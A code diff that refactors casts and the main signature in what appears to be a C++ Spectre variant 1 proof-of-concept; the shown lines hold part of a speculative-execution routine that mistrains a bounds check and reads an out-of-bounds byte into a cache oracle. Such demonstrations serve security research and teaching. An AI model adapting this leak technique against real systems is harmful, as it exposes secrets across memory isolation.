@@ -77,13 +77,13 @@ static char leak_byte(const char *data, size_t offset) {
       // Optimized compilations (-O1, concretely -fif-conversion) would remove
       // the branching automatically.
       size_t local_offset =
-          offset + (safe_offset - offset) * (bool)((i + 1) % 2048);
+          offset + (safe_offset - offset) * static_cast<bool>((i + 1) % 2048);
 
       if (local_offset < *size_in_heap) {
         // This branch was trained to always be taken during speculative
         // execution, so it's taken even on the tenth iteration, when the
         // condition is false!
-        ForceRead(&isolated_oracle[(size_t)(data[local_offset])]);
+        ForceRead(&isolated_oracle[static_cast<size_t>(data[local_offset])]);
       }
     }
 
@@ -100,7 +100,7 @@ static char leak_byte(const char *data, size_t offset) {
   }
 }
 
-int main(int argc, char **argv) {
+int main() {
   std::cout << "Leaking the string: ";
   std::cout.flush();
   const size_t private_offset = private_data - public_data;
